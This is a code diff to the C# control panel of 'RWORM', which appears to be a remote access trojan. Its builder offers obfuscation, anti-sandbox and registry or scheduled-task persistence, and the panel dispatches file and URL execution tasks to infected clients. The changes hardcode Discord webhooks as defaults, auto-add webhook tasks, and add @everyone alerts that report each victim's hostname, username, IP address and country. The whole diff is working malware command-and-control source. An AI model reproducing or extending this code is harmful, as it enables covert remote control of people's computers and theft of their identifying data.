@@ -47,7 +47,7 @@ namespace RWORM.GUI.ViewModels
 
         // Tasks Discord Webhook options
         private bool   _taskDiscordAlert = true;
-        private string _taskDiscordWebhook = "";
+        private string _taskDiscordWebhook = WebhookConfig.TaskAlertWebhook;
         public bool    TaskDiscordAlert   { get => _taskDiscordAlert; set { _taskDiscordAlert = value; OnPropertyChanged(); } }
         public string  TaskDiscordWebhook
         {
@@ -60,7 +60,7 @@ namespace RWORM.GUI.ViewModels
         private bool   _buildObfuscator = false;
         private bool   _buildAntiSandbox;
         private bool   _buildDiscordAlert;
-        private string _buildDiscordWebhook = "";
+        private string _buildDiscordWebhook = WebhookConfig.BuilderWebhook;
         private bool   _buildStartupRegistry;
         private bool   _buildSchTasks;
         private string _buildStartupPath = "%APPDATA%\\RWORM";
@@ -291,6 +291,20 @@ namespace RWORM.GUI.ViewModels
                 if (p is TaskModel t) Tasks.Remove(t);
                 else if (SelectedTask != null) Tasks.Remove(SelectedTask);
             });
+
+            // Discord Webhook tasks hardcoded from webhooks.json
+            foreach (var (name, webhook) in WebhookConfig.WebhookTasks)
+            {
+                if (string.IsNullOrWhiteSpace(webhook)) continue;
+                var webhookTask = new TaskModel
+                {
+                    Name   = string.IsNullOrWhiteSpace(name) ? "Discord Webhook" : name,
+                    Mode   = TaskMode.DiscordWebhook,
+                    Source = webhook.Trim(),
+                    Status = "Active",
+                };
+                Tasks.Add(webhookTask);
+            }
         }
 
         // ── Connect / Disconnect ──────────────────────────────────────────────
@@ -797,22 +811,24 @@ namespace RWORM.GUI.ViewModels
             task.ExecutedKeys.Add(sessionKey);
 
             _ = SendTaskDiscordAlertAsync(
-                "📋 Task Dispatched to Client",
-                $"Task **{task.Name}** was dispatched to **{client.Hostname}** (`{client.IpAddress}`).",
+                "<:checkmark:1569394022932422656> Task Executed At Client <:pc:1569394483114541056>",
+                $"**{task.Name}** was dispatched to <:windows:1569394768310706278> **{client.Hostname}** | `{client.IpAddress}`.",
                 task.Name,
                 $"{client.Hostname} ({client.IpAddress})",
-                task.ModeLabel);
+                task.ModeLabel,
+                WebhookConfig.WebhookEveryone);
 
                         if (task.Mode == TaskMode.DiscordWebhook)
             {
                 task.ExecutedCount++;
                 task.Status = $"Active ({task.ExecutedCount} executions)";
                 _ = SendTaskDiscordAlertAsync(
-                    "Client Connected",
-                    $"Client **{client.Hostname}** ({client.Username}) connected from `{client.IpAddress}` [{client.CountryCode}].",
+                    $"<:windows:1569394768310706278> {client.Hostname} Connected",
+                    $"<:pc:1569394483114541056>**{client.Hostname}** <:client:1569397753006530701>{client.Username} connected from `{client.IpAddress}` [{client.CountryCode}].",
                     task.Name,
                     $"{client.Hostname} ({client.IpAddress})",
-                    "Discord Webhook");
+                    "Discord Webhook",
+                    WebhookConfig.WebhookEveryone);
                 return;
             }
 
@@ -860,8 +876,8 @@ namespace RWORM.GUI.ViewModels
             StatusMessage = "Discord Webhook registered";
 
             _ = SendTaskDiscordAlertAsync(
-                "Discord Webhook Configured",
-                "Discord Webhook alert integration active on RWORM tasks system.",
+                "<:checkmark:1569394022932422656> Webhook Config Saved ",
+                "<:rworm:1569398461084733520> Rworm Webhook alert system activated.",
                 task.Name,
                 "All Clients",
                 task.ModeLabel);
@@ -893,8 +909,8 @@ namespace RWORM.GUI.ViewModels
             StatusMessage = $"Task added: {task.Name}";
 
             _ = SendTaskDiscordAlertAsync(
-                "📁 Local File Task Registered",
-                $"Task **{task.Name}** registered from local file: `{task.Source}`",
+                "<:registry:1569398933782794431> New Task Registered",
+                $"Local File run task saved to config: `{task.Source}`",
                 task.Name,
                 "Broadcast to connected clients",
                 task.ModeLabel);
@@ -922,8 +938,8 @@ namespace RWORM.GUI.ViewModels
             StatusMessage = $"URL task added";
 
             _ = SendTaskDiscordAlertAsync(
-                "🔗 URL Task Registered",
-                $"URL Task **{task.Name}** registered: `{task.Source}`",
+                "<:registry:1569398933782794431> New Task Registered",
+                $"URL File run tsk saved to config: `{task.Source}`",
                 task.Name,
                 "Broadcast to connected clients",
                 task.ModeLabel);
@@ -979,21 +995,22 @@ namespace RWORM.GUI.ViewModels
                 using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
                 var payload = new
                 {
-                    username = "RWORM Tasks Alert",
-                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
+                    username = "RWorm BITA",
+                    avatar_url = "https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true",
                     embeds = new[]
                     {
                         new
                         {
-                            title = "🔔 RWORM Discord Webhook Test",
-                            description = "Webhook alerts for Tasks and Clients are successfully connected and functioning!",
-                            color = 0x58A6FF,
+                            title = "<:rworm:1569398461084733520> Webhook test",
+                            description = "Rworm Built In Task Alert test embed",
+                            color = 12648448,
+                            thumbnail = new { url = WebhookConfig.WebhookThumbnailUrl },
                             fields = new[]
                             {
-                                new { name = "Status", value = "Online / Operational", inline = true },
+                                new { name = "Status", value = "<:checkmark:1569394022932422656>", inline = true },
                                 new { name = "Sender", value = Environment.MachineName, inline = true }
                             },
-                            footer = new { text = "RWORM Task Notification System" },
+                            footer = new { text = "RWorm Build In Task Alerts" },
                             timestamp = DateTime.UtcNow.ToString("o")
                         }
                     }
@@ -1020,7 +1037,7 @@ namespace RWORM.GUI.ViewModels
             }
         }
 
-        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode)
+        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode, string content = null)
         {
             var url = TaskDiscordWebhook;
             if (!TaskDiscordAlert || string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
@@ -1031,22 +1048,24 @@ namespace RWORM.GUI.ViewModels
                 using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
                 var payload = new
                 {
-                    username = "RWORM Tasks Alert",
-                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
+                    username = "RWorm",
+                    avatar_url = "https://github.com/exsarorrayzer/rworm/blob/main/GUI/Resources/Assets/rwormicon.png?raw=true",
+                    content = (string.IsNullOrWhiteSpace(content) ? "" : content),
                     embeds = new[]
                     {
                         new
                         {
                             title = title,
                             description = description,
-                            color = 0x2ECC71, // Green
+                            color = 16711680,
+                            thumbnail = new { url = WebhookConfig.WebhookThumbnailUrl },
                             fields = new[]
                             {
-                                new { name = "Task", value = taskName, inline = true },
-                                new { name = "Target", value = targetClient, inline = true },
+                                new { name = "TASK ID", value = taskName, inline = true },
+                                new { name = "Client", value = targetClient, inline = true },
                                 new { name = "Type", value = mode, inline = true }
                             },
-                            footer = new { text = "RWORM Task Dispatcher" },
+                            footer = new { text = "github.com/exsarorrayzer/rworm" },
                             timestamp = DateTime.UtcNow.ToString("o")
                         }
                     }
